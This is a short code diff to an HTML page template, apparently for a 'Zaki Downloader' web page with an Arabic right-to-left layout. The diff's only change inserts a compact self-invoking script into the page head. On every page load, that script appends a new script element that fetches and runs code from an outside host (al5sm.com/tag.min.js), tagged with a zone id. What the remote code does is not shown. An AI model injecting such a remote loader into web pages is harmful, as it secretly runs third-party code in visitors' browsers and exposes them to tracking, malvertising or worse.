@@ -10,6 +10,7 @@ HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
+ <script>(function(s){s.dataset.zone='12146865',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zaki Downloader</title>
